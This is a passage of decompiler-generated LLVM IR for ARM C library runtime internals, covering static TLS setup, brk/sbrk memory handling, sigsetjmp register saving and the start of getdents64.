  %v1_17a90 = add i32 %v0_17a8c66, 8
  %v2_17a90 = inttoptr i32 %v1_17a90 to i32*
  %v3_17a90 = load i32, i32* %v2_17a90, align 4
  store i32 %v3_17a90, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_17a84, %v0_17a5c
  %v0_17a5c.v3_17a84 = select i1 %tmp78, i32 %v0_17a5c, i32 %v3_17a84
  store i32 %v0_17a5c.v3_17a84, i32* %fp.global-to-local, align 4
  %v2_17ac8 = icmp eq i32 %v3_17a84, 0
  br i1 %v2_17ac8, label %dec_label_pc_17af0, label %bb

dec_label_pc_17aac:                               ; preds = %dec_label_pc_17a74
  %v1_17aac = add i32 %v0_17a8c66, 32
  store i32 %v1_17aac, i32* %r1.global-to-local, align 4
  %v2_17ab0 = load i32, i32* %v1_17ab0, align 4
  %v4_17ab4 = mul i32 %v2_17ab0, 32
  %v5_17ab4 = add i32 %v4_17ab4, %v2_17a4c
  store i32 %v5_17ab4, i32* %r3.global-to-local, align 4
  %v3_17ab8 = icmp ult i32 %v1_17aac, %v5_17ab4
  br i1 %v3_17ab8, label %dec_label_pc_17a74, label %dec_label_pc_17ab0.dec_label_pc_17c24.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_17a80
  %v2_17acc = add i32 %v3_17a84, -1
  br label %dec_label_pc_17af4

dec_label_pc_17af0:                               ; preds = %dec_label_pc_17a80, %dec_label_pc_17c24
  %v0_17b04.pre = phi i32 [ %v0_17b04.pre.pre, %dec_label_pc_17c24 ], [ ptrtoint (i32* @global_var_22010.349 to i32), %dec_label_pc_17a80 ]
  %v1_17af4.pre = phi i32 [ %v1_17af4.pre.pre, %dec_label_pc_17c24 ], [ %v0_17a58, %dec_label_pc_17a80 ]
  %v1_17b1825 = phi i32 [ %v0_17c2c, %dec_label_pc_17c24 ], [ %v0_17a5c.v3_17a84, %dec_label_pc_17a80 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17c24 ], [ %v3_17a80, %dec_label_pc_17a80 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17c24 ], [ %v3_17a8c, %dec_label_pc_17a80 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17c24 ], [ %v3_17a90, %dec_label_pc_17a80 ]
  br label %dec_label_pc_17af4

dec_label_pc_17af4:                               ; preds = %bb, %dec_label_pc_17af0
  %storemerge80 = phi i32 [ %v2_17acc, %bb ], [ 0, %dec_label_pc_17af0 ]
  %v0_17af4 = phi i32 [ %v2_17acc, %bb ], [ 0, %dec_label_pc_17af0 ]
  %storemerge = phi i32 [ %v3_17a84, %bb ], [ 1, %dec_label_pc_17af0 ]
  %storemerge79 = phi i32 [ %v3_17a84, %bb ], [ 1, %dec_label_pc_17af0 ]
  %v0_17b04 = phi i32 [ ptrtoint (i32* @global_var_22010.349 to i32), %bb ], [ %v0_17b04.pre, %dec_label_pc_17af0 ]
  %v1_17af4 = phi i32 [ %v0_17a58, %bb ], [ %v1_17af4.pre, %dec_label_pc_17af0 ]
  %v1_17b18 = phi i32 [ %v0_17a5c.v3_17a84, %bb ], [ %v1_17b1825, %dec_label_pc_17af0 ]
  %stack_var_-52.3 = phi i32 [ %v3_17a80, %bb ], [ %stack_var_-52.0, %dec_label_pc_17af0 ]
  %stack_var_-48.3 = phi i32 [ %v3_17a8c, %bb ], [ %stack_var_-48.0, %dec_label_pc_17af0 ]
  %stack_var_-44.3 = phi i32 [ %v3_17a90, %bb ], [ %stack_var_-44.0, %dec_label_pc_17af0 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_17af4 = add i32 %v1_17af4, %v0_17af4
  %v2_17af8 = udiv i32 %v2_17af4, %storemerge
  store i32 %v2_17af8, i32* %r0.global-to-local, align 4
  %v2_17afc = mul i32 %v2_17af8, %storemerge
  store i32 %v2_17afc, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17b04 = add i32 %v0_17b04, 72
  %v3_17b04 = inttoptr i32 %v2_17b04 to i32*
  %v4_17b04 = load i32, i32* %v3_17b04, align 4
  store i32 %v4_17b04, i32* %r3.global-to-local, align 4
  %v1_17b08 = inttoptr i32 %v4_17b04 to i32*
  %v2_17b08 = load i32, i32* %v1_17b08, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_17b10 = add i32 %v1_17b18, 1168
  %v2_17b14 = add i32 %v1_17b10, %stack_var_-52.3
  %v2_17b18 = add i32 %v2_17b14, %v2_17afc
  %v2_17b1c = add i32 %v2_17b18, %v2_17b08
  store i32 %v2_17b1c, i32* %r0.global-to-local, align 4
  %v1_17b20 = call i32 @__GI_sbrk(i32 %v2_17b1c)
  %v1_17b24 = load i32, i32* %fp.global-to-local, align 4
  %v1_17b2c = sub i32 0, %v1_17b24
  store i32 10236, i32* %r4.global-to-local, align 4
  %v2_17b24 = add i32 %v1_17b20, 1167
  %v1_17b34 = add i32 %v2_17b24, %v1_17b24
  %v2_17b38 = and i32 %v1_17b34, %v1_17b2c
  store i32 %v2_17b38, i32* @r5, align 4
  %v1_17b40 = load i32, i32* %sl.global-to-local, align 4
  %v3_17b40 = add i32 %v1_17b40, 10236
  %v4_17b40 = inttoptr i32 %v3_17b40 to i32*
  store i32 62, i32* %v4_17b40, align 4
  %v0_17b48 = load i32, i32* @r5, align 4
  %v1_17b48 = load i32, i32* %sb.global-to-local, align 4
  %v2_17b48 = add i32 %v1_17b48, %v0_17b48
  store i32 %v2_17b48, i32* @ip, align 4
  %v0_17b4c = load i32, i32* %sl.global-to-local, align 4
  %v1_17b4c = load i32, i32* %r4.global-to-local, align 4
  %v2_17b4c = add i32 %v1_17b4c, %v0_17b4c
  store i32 %v2_17b4c, i32* %r4.global-to-local, align 4
  %v2_17b50 = add i32 %v0_17b4c, 11524
  store i32 %v2_17b50, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_17b48, i32* @r0, align 4
  %v2_17b64 = add i32 %v2_17b4c, 16
  %v3_17b64 = inttoptr i32 %v2_17b64 to i32*
  store i32 %v2_17b48, i32* %v3_17b64, align 4
  %v0_17b68 = load i32, i32* %sb.global-to-local, align 4
  %v1_17b68 = load i32, i32* %r8.global-to-local, align 4
  %v2_17b68 = add i32 %v1_17b68, 40
  %v3_17b68 = inttoptr i32 %v2_17b68 to i32*
  store i32 %v0_17b68, i32* %v3_17b68, align 4
  %v0_17b6c = load i32, i32* @r3, align 4
  %v1_17b6c = trunc i32 %v0_17b6c to i8
  %v2_17b6c = load i32, i32* %r4.global-to-local, align 4
  %v3_17b6c = add i32 %v2_17b6c, 20
  %v4_17b6c = inttoptr i32 %v3_17b6c to i8*
  store i8 %v1_17b6c, i8* %v4_17b6c, align 1
  %v0_17b70 = load i32, i32* %r4.global-to-local, align 4
  %v1_17b70 = add i32 %v0_17b70, 8
  store i32 %v1_17b70, i32* @r4, align 4
  %v0_17b74 = call i32 @memcpy()
  %v0_17b7c = load i32, i32* @r4, align 4
  %v1_17b7c = load i32, i32* @r5, align 4
  %v2_17b7c = inttoptr i32 %v1_17b7c to i32*
  store i32 %v0_17b7c, i32* %v2_17b7c, align 4
  %v0_17b80 = load i32, i32* @r5, align 4
  store i32 %v0_17b80, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_17b80, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_13470.537 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_17b94 = load i32, i32* %sl.global-to-local, align 4
  %v2_17b94 = add i32 %v0_17b94, 84
  %v3_17b94 = inttoptr i32 %v2_17b94 to i32*
  %v4_17b94 = load i32, i32* %v3_17b94, align 4
  store i32 %v4_17b94, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10748, i32* %r1.global-to-local, align 4
  %v2_17ba0 = add i32 %v0_17b94, 60
  %v3_17ba0 = inttoptr i32 %v2_17ba0 to i32*
  %v4_17ba0 = load i32, i32* %v3_17ba0, align 4
  store i32 %v4_17ba0, i32* %r0.global-to-local, align 4
  %v3_17ba8 = add i32 %v0_17b94, 10748
  %v4_17ba8 = inttoptr i32 %v3_17ba8 to i32*
  store i32 64, i32* %v4_17ba8, align 4
  %v1_17bb0 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bb0 = add i32 %v1_17bb0, 20
  %v3_17bb0 = inttoptr i32 %v2_17bb0 to i32*
  store i32 %stack_var_-44.3, i32* %v3_17bb0, align 4
  %v1_17bb8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bb8 = add i32 %v1_17bb8, 24
  %v3_17bb8 = inttoptr i32 %v2_17bb8 to i32*
  store i32 %stack_var_-48.3, i32* %v3_17bb8, align 4
  %v1_17bc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_17bc0 = inttoptr i32 %v1_17bc0 to i32*
  store i32 1, i32* %v2_17bc0, align 4
  %v1_17bc8 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bc8 = add i32 %v1_17bc8, 28
  %v3_17bc8 = inttoptr i32 %v2_17bc8 to i32*
  store i32 %stack_var_-52.3, i32* %v3_17bc8, align 4
  %v0_17bd0 = load i32, i32* @r6, align 4
  %v2_17bd0 = icmp eq i32 %v0_17bd0, 0
  %v1_17bd4 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bd4 = add i32 %v1_17bd4, 44
  %v3_17bd4 = inttoptr i32 %v2_17bd4 to i32*
  store i32 1, i32* %v3_17bd4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_17bdc = load i32, i32* %sl.global-to-local, align 4
  %v1_17bdc = load i32, i32* %r1.global-to-local, align 4
  %v2_17bdc = add i32 %v1_17bdc, %v0_17bdc
  store i32 %v2_17bdc, i32* %r2.global-to-local, align 4
  %v1_17be0 = load i32, i32* @r6, align 4
  br i1 %v2_17bd0, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_17af4
  store i32 %v1_17be0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17bec34 = load i32, i32* %r8.global-to-local, align 4
  %v2_17bec35 = add i32 %v1_17bec34, 32
  %v3_17bec36 = inttoptr i32 %v2_17bec35 to i32*
  store i32 %v1_17be0, i32* %v3_17bec36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_17af4
  %v2_17be4 = add i32 %v1_17be0, -1
  store i32 %v2_17be4, i32* %r0.global-to-local, align 4
  %v1_17bec = load i32, i32* %r8.global-to-local, align 4
  %v2_17bec = add i32 %v1_17bec, 32
  %v3_17bec = inttoptr i32 %v2_17bec to i32*
  store i32 %v1_17be0, i32* %v3_17bec, align 4
  %v1_17bf0 = load i32, i32* @r6, align 4
  store i32 %v1_17bf0, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_17bf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_17bf4 = load i32, i32* %r2.global-to-local, align 4
  %v2_17bf4 = add i32 %v1_17bf4, 28
  %v3_17bf4 = inttoptr i32 %v2_17bf4 to i32*
  store i32 %v0_17bf4, i32* %v3_17bf4, align 4
  %v0_17bf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17bf8 = load i32, i32* %ip.global-to-local, align 4
  %v2_17bf8 = inttoptr i32 %v1_17bf8 to i32*
  store i32 %v0_17bf8, i32* %v2_17bf8, align 4
  %v0_17bfc = load i32, i32* %r0.global-to-local, align 4
  %v1_17bfc = load i32, i32* %r3.global-to-local, align 4
  %v2_17bfc = add i32 %v1_17bfc, %v0_17bfc
  store i32 %v2_17bfc, i32* %r0.global-to-local, align 4
  %v1_17c00 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_17bd0, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_17c08.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_17c08 = phi i32 [ %v0_17c08.pre, %._crit_edge ], [ %v1_17c00, %bb54 ]
  %v2_17c04 = udiv i32 %v2_17bfc, %v1_17c00
  %v2_17c08 = load i32, i32* %sb.global-to-local, align 4
  %v3_17c08 = mul i32 %v2_17c04, %v0_17c08
  %v4_17c08 = add i32 %v2_17c08, %v3_17c08
  store i32 %v4_17c08, i32* @r0, align 4
  %v0_17c0c = load i32, i32* %fp.global-to-local, align 4
  %v2_17c0c = icmp ult i32 %v0_17c0c, 16
  %v0_17c0c. = select i1 %v2_17c0c, i32 16, i32 %v0_17c0c
  store i32 %v0_17c0c., i32* @r1, align 4
  %v2_17c1c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17c1c, i32* @r4, align 4
  store i32 %v6_17a38, i32* @r5, align 4
  store i32 %v15_17a38, i32* %r8.global-to-local, align 4
  store i32 %v18_17a38, i32* %sb.global-to-local, align 4
  store i32 %v21_17a38, i32* %sl.global-to-local, align 4
  store i32 %v24_17a38, i32* %fp.global-to-local, align 4
  store i32 %v27_17a38, i32* @lr, align 4
  %v0_17c20 = call i32 @init_static_tls()
  store i32 %v0_17c20, i32* %r0.global-to-local, align 4
  %v0_17c2c.pre = load i32, i32* @ip, align 4
  %v1_17af4.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_17b04.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17c24

dec_label_pc_17ab0.dec_label_pc_17c24.loopexit_crit_edge: ; preds = %dec_label_pc_17aac
  br label %dec_label_pc_17c24.loopexit

dec_label_pc_17c24.loopexit:                      ; preds = %dec_label_pc_17ab0.dec_label_pc_17c24.loopexit_crit_edge, %dec_label_pc_17a64
  br label %dec_label_pc_17c24

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c24.loopexit, %entry, %bb55
  %v0_17b04.pre.pre = phi i32 [ ptrtoint (i32* @global_var_22010.349 to i32), %dec_label_pc_17c24.loopexit ], [ ptrtoint (i32* @global_var_22010.349 to i32), %entry ], [ %v0_17b04.pre.pre.pre, %bb55 ]
  %v1_17af4.pre.pre = phi i32 [ %v0_17a58, %dec_label_pc_17c24.loopexit ], [ %v0_17a58, %entry ], [ %v1_17af4.pre.pre.pre, %bb55 ]
  %v0_17c2c = phi i32 [ %v0_17a5c, %dec_label_pc_17c24.loopexit ], [ %v0_17a5c, %entry ], [ %v0_17c2c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_17c2c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17af0

; uselistorder directives
  uselistorder i32 %v0_17c2c, { 1, 0 }
  uselistorder i32 %v1_17be0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17b4c, { 1, 0 }
  uselistorder i32 %v2_17b48, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_17aac, { 2, 1, 0 }
  uselistorder i32 %v3_17a84, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_17a8c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_17ab0, { 1, 0 }
  uselistorder i32 %v0_17a5c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_17a58, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17a4c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 7, 6, 8, 9, 10, 11, 12, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10748, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_17c24, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_17af4, { 1, 0 }
  uselistorder label %dec_label_pc_17af0, { 1, 0 }
  uselistorder label %dec_label_pc_17a74, { 1, 0 }
}

define i32 @function_17c44(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17c44:
  %v0_17c44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17c44, label %.thread2, label %.thread7

.thread2:                                         ; preds = %dec_label_pc_17c44
  call void @llvm.trap()
  unreachable

.thread7:                                         ; preds = %dec_label_pc_17c44
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_17c70 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_17c70
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v4_17c80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 156) to i32*), align 4
  %v4_17c88 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 104) to i32*), align 4
  store i32 %v4_17c88, i32* %r1.global-to-local, align 4
  %v1_17c8c = add i32 %arg1, 44
  %v2_17c8c = inttoptr i32 %v1_17c8c to i32*
  %v3_17c8c = load i32, i32* %v2_17c8c, align 4
  %v1_17c90 = add i32 %arg1, 28
  %v2_17c90 = inttoptr i32 %v1_17c90 to i32*
  %v3_17c90 = load i32, i32* %v2_17c90, align 4
  store i32 %v3_17c90, i32* %r2.global-to-local, align 4
  %v2_17c94 = inttoptr i32 %v4_17c80 to i32*
  store i32 %v3_17c8c, i32* %v2_17c94, align 4
  %v0_17c98 = load i32, i32* %r2.global-to-local, align 4
  %v1_17c98 = load i32, i32* %r1.global-to-local, align 4
  %v2_17c98 = inttoptr i32 %v1_17c98 to i32*
  store i32 %v0_17c98, i32* %v2_17c98, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 4, 6, 3, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_17ca4(i32 %arg1) local_unnamed_addr {
dec_label_pc_17ca4:
  %v0_17ca4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17ca4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17ca4
  %v1_17ca4 = load i32, i32* @ip, align 4
  %v3_17ca4 = mul i32 %v1_17ca4, %arg1
  %v2_17ca8 = load i32, i32* @r8, align 4
  %v4_17ca8 = and i32 %v2_17ca8, %v3_17ca4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17ca4, %bb
  %v5_17ca8 = phi i32 [ %arg1, %dec_label_pc_17ca4 ], [ %v4_17ca8, %bb ]
  ret i32 %v5_17ca8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_17cb4 = add i32 %arg1, 40
  store i32 %v1_17cb4, i32* %r2.global-to-local, align 4
  %v1_17cb8 = inttoptr i32 %v1_17cb4 to i32*
  %v2_17cb8 = load i32, i32* %v1_17cb8, align 4
  store i32 %v2_17cb8, i32* %r2.global-to-local, align 4
  %v3_17cb8 = add i32 %arg1, 44
  %v4_17cb8 = inttoptr i32 %v3_17cb8 to i32*
  %v5_17cb8 = load i32, i32* %v4_17cb8, align 4
  store i32 %v5_17cb8, i32* %r3.global-to-local, align 4
  %v0_17cbc = call i32 @__aeabi_read_tp()
  %v1_17cc0 = inttoptr i32 %v0_17cbc to i32*
  %v2_17cc0 = load i32, i32* %v1_17cc0, align 4
  store i32 %v2_17cc0, i32* %r1.global-to-local, align 4
  %v3_17cc4 = mul i32 %v5_17cb8, 8
  store i32 %v3_17cc4, i32* %r3.global-to-local, align 4
  %v1_17cc8 = load i32, i32* %r2.global-to-local, align 4
  %v2_17cc8 = add i32 %v1_17cc8, %v0_17cbc
  %v3_17ccc = add i32 %v3_17cc4, %v2_17cc0
  %v4_17ccc = inttoptr i32 %v3_17ccc to i32*
  store i32 %v2_17cc8, i32* %v4_17ccc, align 4
  %v0_17cd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_17cd0 = load i32, i32* %r1.global-to-local, align 4
  %v2_17cd0 = add i32 %v1_17cd0, %v0_17cd0
  store i32 %v2_17cd0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_17cd8 = add i32 %v2_17cd0, 4
  %v5_17cd8 = inttoptr i32 %v4_17cd8 to i8*
  store i8 1, i8* %v5_17cd8, align 1
  %v0_17cdc = load i32, i32* @r4, align 4
  %v1_17cdc = add i32 %v0_17cdc, 20
  store i32 %v1_17cdc, i32* %r1.global-to-local, align 4
  %v1_17ce0 = inttoptr i32 %v1_17cdc to i32*
  %v2_17ce0 = load i32, i32* %v1_17ce0, align 4
  store i32 %v2_17ce0, i32* @r1, align 4
  %v3_17ce0 = add i32 %v0_17cdc, 24
  %v4_17ce0 = inttoptr i32 %v3_17ce0 to i32*
  %v5_17ce0 = load i32, i32* %v4_17ce0, align 4
  store i32 %v5_17ce0, i32* %r2.global-to-local, align 4
  %v5_17ce4 = call i32 @__GI_mempcpy(i32 %v2_17cc8, i32 %v2_17ce0, i32 %v5_17ce0, i32 1)
  %v0_17ce8 = load i32, i32* @r4, align 4
  %v1_17ce8 = add i32 %v0_17ce8, 28
  store i32 %v1_17ce8, i32* %r3.global-to-local, align 4
  %v1_17cec = inttoptr i32 %v1_17ce8 to i32*
  %v2_17cec = load i32, i32* %v1_17cec, align 4
  store i32 %v2_17cec, i32* %r2.global-to-local, align 4
  %v3_17cec = add i32 %v0_17ce8, 24
  %v4_17cec = inttoptr i32 %v3_17cec to i32*
  %v5_17cec = load i32, i32* %v4_17cec, align 4
  store i32 %v5_17cec, i32* %r3.global-to-local, align 4
  %v2_17cf0 = sub i32 %v5_17cec, %v2_17cec
  store i32 %v2_17cf0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_17cf8 = inttoptr i32 %v5_17ce4 to i8*
  %v4_17cf8 = call i32 @__GI_memset(i8* %v3_17cf8, i32 0, i32 %v2_17cf0)
  ret i32 %v4_17cf8

; uselistorder directives
  uselistorder i32 %v3_17cc4, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 0, 1, 2, 3, 5, 4, 11, 10, 9, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i8 1, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_17d48:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 11576) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_17d5c = load i32, i32* @r0, align 4
  %v1_17d60 = inttoptr i32 %v0_17d5c to i32*
  %v2_17d60 = load i32, i32* @r4, align 4
  store i32 %v2_17d60, i32* %v1_17d60, align 4
  %v3_17d60 = add i32 %v0_17d5c, 4
  %v4_17d60 = inttoptr i32 %v3_17d60 to i32*
  %v5_17d60 = load i32, i32* @r5, align 4
  store i32 %v5_17d60, i32* %v4_17d60, align 4
  %v6_17d60 = add i32 %v0_17d5c, 8
  %v7_17d60 = inttoptr i32 %v6_17d60 to i32*
  %v8_17d60 = load i32, i32* @r6, align 4
  store i32 %v8_17d60, i32* %v7_17d60, align 4
  %v9_17d60 = add i32 %v0_17d5c, 12
  %v10_17d60 = inttoptr i32 %v9_17d60 to i32*
  %v11_17d60 = load i32, i32* @r7, align 4
  store i32 %v11_17d60, i32* %v10_17d60, align 4
  %v12_17d60 = add i32 %v0_17d5c, 16
  %v13_17d60 = inttoptr i32 %v12_17d60 to i32*
  %v14_17d60 = load i32, i32* @r8, align 4
  store i32 %v14_17d60, i32* %v13_17d60, align 4
  %v15_17d60 = add i32 %v0_17d5c, 20
  %v16_17d60 = inttoptr i32 %v15_17d60 to i32*
  %v17_17d60 = load i32, i32* @sb, align 4
  store i32 %v17_17d60, i32* %v16_17d60, align 4
  %v18_17d60 = add i32 %v0_17d5c, 24
  %v19_17d60 = inttoptr i32 %v18_17d60 to i32*
  %v20_17d60 = load i32, i32* @sl, align 4
  store i32 %v20_17d60, i32* %v19_17d60, align 4
  %v21_17d60 = add i32 %v0_17d5c, 28
  %v22_17d60 = inttoptr i32 %v21_17d60 to i32*
  %v23_17d60 = load i32, i32* @fp, align 4
  store i32 %v23_17d60, i32* %v22_17d60, align 4
  %v24_17d60 = add i32 %v0_17d5c, 32
  %v25_17d60 = inttoptr i32 %v24_17d60 to i32*
  %v27_17d60 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_17d60, i32* %v25_17d60, align 4
  %v28_17d60 = add i32 %v0_17d5c, 36
  %v29_17d60 = inttoptr i32 %v28_17d60 to i32*
  %v30_17d60 = load i32, i32* @lr, align 4
  store i32 %v30_17d60, i32* %v29_17d60, align 4
  %v0_17d64 = call i32 @__sigjmp_save()
  ret i32 %v0_17d64

; uselistorder directives
  uselistorder i32 %v0_17d5c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 107, 108, 14, 15, 16, 17, 18, 19, 20, 21, 95, 96, 97, 98, 99, 101, 100, 102, 31, 32, 33, 34, 35, 36, 37, 4, 1, 2, 3, 5, 6, 7, 8, 9, 39, 38, 40, 41, 42, 43, 22, 23, 24, 25, 26, 27, 28, 29, 30, 44, 47, 45, 46, 0, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 10, 11, 12, 13, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 88, 86, 87, 89, 90, 93, 91, 92, 94, 103, 104, 105, 106, 109 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_17d6c = load i32, i32* @r5, align 4
  %v12_17d6c = load i32, i32* @r7, align 4
  %v1_17d70 = add i32 %arg3, 14
  %v2_17d78 = ptrtoint i32* %stack_var_-72 to i32
  %v1_17d7c = and i32 %v1_17d70, -8
  %v2_17d80 = sub i32 %v2_17d78, %v1_17d7c
  %v1_17d84 = add i32 %v2_17d80, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_17dc8, label %dec_label_pc_17dac

dec_label_pc_17dac:                               ; preds = %entry
  %v1_17db0 = sub i32 0, %arg1
  %v3_17db4 = load i16, i16* @global_var_22068.345, align 2
  %v4_17db4 = sext i16 %v3_17db4 to i32
  %v0_17db8 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17dc0 = add i32 %v4_17db4, %v0_17db8
  %v4_17dc0 = inttoptr i32 %v3_17dc0 to i32*
  store i32 %v1_17db0, i32* %v4_17dc0, align 4
  br label %dec_label_pc_17e98

dec_label_pc_17dc8:                               ; preds = %entry
  br i1 false, label %dec_label_pc_17e98, label %dec_label_pc_17dd0

dec_label_pc_17dd0:                               ; preds = %dec_label_pc_17dc8
  %v2_17dd0 = add i32 %v1_17d84, %arg1
  store i32 %v2_17dd0, i32* %r1.global-to-local, align 4
  %v2_17dd4 = add i32 %tmp, %arg3
  store i32 %v1_17d84, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17e80

dec_label_pc_17df0:                               ; preds = %dec_label_pc_17e80
  %v1_17df0 = add i32 %v0_17e50, 16
  %v2_17df0 = inttoptr i32 %v1_17df0 to i16*
  %v3_17df0 = load i16, i16* %v2_17df0, align 2
